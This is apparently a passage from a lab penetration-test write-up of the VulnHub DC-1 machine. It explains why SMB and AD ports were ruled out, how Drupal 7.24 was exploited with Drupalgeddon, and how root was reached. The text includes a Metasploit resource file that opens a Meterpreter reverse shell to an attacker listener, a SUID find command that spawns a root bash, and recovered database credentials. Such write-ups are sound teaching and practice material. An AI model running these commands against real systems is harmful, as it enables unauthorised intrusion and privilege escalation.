WHAT THE CLOSED PORTS RULE OUT
------------------------------

The full scan returned reset for 65531 TCP ports. In practical terms:

  - No 139/445 SMB, so no SMB null session, SMB signing, MS17-010, or share
    enumeration was possible on the target.
  - No 135 RPC endpoint mapper, no 3389 RDP, no 5985/5986 WinRM.
  - No 389/636 LDAP, no 88 Kerberos, no 53 DNS, no 3268/3269 global catalog.
    The target is not acting as the domain controller.
  - No 21 FTP, no 3306 MySQL, no 5432 PostgreSQL, no 6379 Redis exposed.
  - No 2049 NFS on TCP; the UDP scan and showmount also failed to find NFS.

The absence of AD ports on 10.0.2.7 is consistent with a standalone Linux
web server, which is what the hostname and later local enumeration confirmed.

DRUPALGEDDON
------------

Why I chose it:
The target was Drupal 7.24. Searchsploit had:

  Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection
  php/webapps/34984.py
  php/webapps/34992.py
  php/webapps/34993.php
  php/webapps/35150.php
  php/webapps/44355.php

The exact version 7.24 is below the 7.32 fix, so CVE-2014-3704 was the obvious
pre-auth path. I used the Metasploit module rather than a random public exploit
because it was already installed, readable, and used a crash-safe form-cache
method that cleans up its own cache entries.

First I checked whether the module supported a non-exploiting check:

  $ msfconsole -q -x 'use exploit/multi/http/drupal_drupageddon; \
      set RHOSTS 10.0.2.7; set RPORT 80; set TARGETURI /; check; exit'

  [-] This module does not support check.

That was a dead end. There was no built-in version probe, so I moved to the
exploit with the exact version already verified.

I used this resource file:

  spool /home/shrdx/Documents/DC_VulnHub/evidence/msf_console.log
  use exploit/multi/http/drupal_drupageddon
  set RHOSTS 10.0.2.7
  set RPORT 80
  set TARGETURI /
  set PAYLOAD php/meterpreter/reverse_tcp
  set LHOST 10.0.2.3
  set LPORT 4444
  set ExitOnSession false
  set Wait 5
  exploit -j
  sleep 20
  sessions -l
  sleep 600

Metasploit warned that ExitOnSession was an unknown datastore option. That was
harmless for this run; the session still opened. The output was:

  [*] Exploit running as background job 0.
  [*] Exploit completed, but no session was created.
  [*] Started reverse TCP handler on 10.0.2.3:4444
  [*] Sending stage (72682 bytes) to 10.0.2.7
  [*] Meterpreter session 1 opened (10.0.2.3:4444 -> 10.0.2.7:44755)
      at 2026-11-27 11:16:06 +0530

  Active sessions
  ===============
    Id  Name  Type                  Information      Connection
    --  ----  ----                  -----------      ----------
    1         meterpreter php/linux  www-data @ DC-1  10.0.2.3:4444 -> 10.0.2.7:44755

The "Exploit completed, but no session was created" line was printed before
the handler had accepted the staged connection; the session list immediately
after it showed session 1. I did not treat the first line as a failure.

WHY THIS METHOD
---------------

The module's default form-cache method injects two cache entries through the
login form's SQL injection, triggers the cached form, and runs the PHP payload.
It then calls cache_clear_all for the generated form IDs. It does not create a
Drupal user, does not change the admin password, and does not write a webshell
to disk.

I did not independently diff the cache_form table. I relied on the module's
cache_clear_all call, and I confirmed the users table still contained only the
original accounts (uid 0, admin, and Fred).

I did not use the user-post method because that would have created an admin
account and content. The form-cache method was the smaller state change.

FIRST ATTEMPT - FAILED
----------------------

I tried the common GTFOBins command:

  $ /usr/bin/find . -maxdepth 0 -exec /bin/sh -p \; -quit
  /bin/sh: 0: Illegal option -p

Debian's /bin/sh is dash, and this dash build rejected -p. No shell was
obtained. That was a dead end, not a failure of the SUID bit.

SECOND ATTEMPT - SUCCESS
------------------------

I used bash, which supports -p:

  $ /usr/bin/find . -maxdepth 0 -exec /bin/bash -p \; -quit

  $ id
  uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)

The real UID stayed 33, but the effective UID was 0. That was enough to read
root-owned files. I did not change the root password, add a user, or install
anything.

===============================================================================
 9. VULNERABILITIES / WEAKNESSES USED
===============================================================================

1. Drupal 7.24 pre-authentication SQL injection (CVE-2014-3704,
   "Drupalgeddon")
   The login form's name parameter was passed through Drupal's
   expandArguments() without safe handling. The Metasploit form-cache method
   used this to inject serialized form data and execute PHP as www-data.
   This was the initial access.

2. Sensitive configuration in the web root
   /var/www/sites/default/settings.php contained the flag2 comment and the
   MySQL credentials dbuser:R0ck3t. Anyone with file read or RCE could use
   them. The file was not readable over HTTP directly, but it was readable
   after the web shell.

3. Unpublished content still stored in the database
   Flag 3 was an unpublished Drupal node. The web UI hid it, but the database
   credentials exposed the body through a simple SELECT. Unpublished does not
   mean secret.

4. SUID root /usr/bin/find
   The binary was SUID root. find's -exec option inherited the effective UID,
   so /bin/bash -p produced euid=0. This was the privilege escalation. The
   flag 3 and flag 4 text both hinted at this exact path.

5. End-of-life software stack
   Debian 7.11, Apache 2.2.22, PHP 5.4.45, Drupal 7.24, and OpenSSH 6.0p1
   were all long past end of life. The SSH server also offered DSA host keys,
   arcfour, 3des, blowfish, cast128, hmac-md5, and diffie-hellman-group1-sha1.
   The old stack was not just cosmetic; it enabled the Drupal exploit.

6. Exposed rpcbind / status service
   Port 111 and 48036/tcp exposed rpcbind and rpc.statd. There was no NFS
   export, so this did not lead to access, but it was unnecessary exposure on
   a web server.

===============================================================================
 10. DEAD ENDS / WHAT DID NOT WORK
===============================================================================

- ICMP was not used as proof of service health. The real scan was -Pn.
- Port 80 was already known open; the full scan added 22, 111, and 48036.
- The DC at 10.0.2.2 was reachable but had all checked AD/DNS/KDC ports
  closed. I skipped Phase 2b entirely. There was no domain context to query.
- /CHANGELOG.txt returned 404. The exact Drupal version had to come from
  includes/bootstrap.inc after the shell.
- /sites/default/settings.php returned HTTP 200 with 0 bytes over the web.
  PHP executed it; it was not directly downloadable.
- settings.php.bak, settings.php~, .git/HEAD, and the .info files were 403.
- /user/1, /user/2, /admin, /cron.php, and /update.php were 403.
- install.php was reachable but only said "Drupal already installed".
- admin/admin and admin/blank Drupal logins failed.
- root/root, root/blank, flag4/flag4, and flag4/blank SSH logins failed.
- The generic gobuster run timed out after 300 seconds.
- The Drupal-specific gobuster run timed out after 300 seconds; its partial
  output included paths from newer Drupal versions that did not apply.
- Nikto timed out after 300 seconds; only partial findings were recorded.
- The Metasploit drupal_drupageddon module has no "check" method. The attempt
  returned "This module does not support check."
- The first SUID find command used /bin/sh -p and failed with
  "/bin/sh: 0: Illegal option -p". /bin/bash -p worked.
- The first attempt to download /root/thefinalflag.txt with Meterpreter
  failed with "stdapi_fs_stat: Operation failed: 1" because Meterpreter was
  www-data, not root. I copied the file to /tmp through the SUID shell first.
- The first cleanup attempt ran as www-data and could not delete the
  root-owned /tmp copies. A second cleanup through the SUID shell succeeded.
- All direct MySQL queries were SELECT-only. The only database writes were the
  Drupalgeddon cache_form inserts performed by the exploit; the module's
  payload calls cache_clear_all for its generated form IDs. I did not diff the
  cache table independently.
- The Meterpreter ls output had corrupted size/date fields. I did not use
  those fields as evidence.
- NFS was not present. showmount returned "Program not registered".
- No SMB, RDP, LDAP, Kerberos, WinRM, FTP, or exposed database service was
  available on the target.

===============================================================================
 11. WHAT I LEARNED
===============================================================================

The box is a good reminder that "old but working" is still dangerous. The
Drupal version was five years behind the fix for Drupalgeddon, and the whole
stack was Debian 7. The web application gave a low-privilege shell, but the
real escalation was a single SUID binary that should never have been SUID.

The flag design also made a point: unpublished content is not protected
content. Flag 3 was hidden from the site but fully readable with the database
credentials from settings.php. The database user was not a Drupal admin, but
it had enough read access to expose the node body.

The DC being down did not block the assessment because the target was a
standalone Linux host. I re-checked the DC at the start and end instead of
assuming it would stay unavailable. No domain-side validation was possible,
so I did not claim any.

The cleanup step mattered. The exploit itself was designed to clear its cache
entries, but my evidence collection created two root-owned /tmp files. I had
to re-establish the session to remove them. The final check returned
CLEANUP_OK, and no Metasploit listener remained.
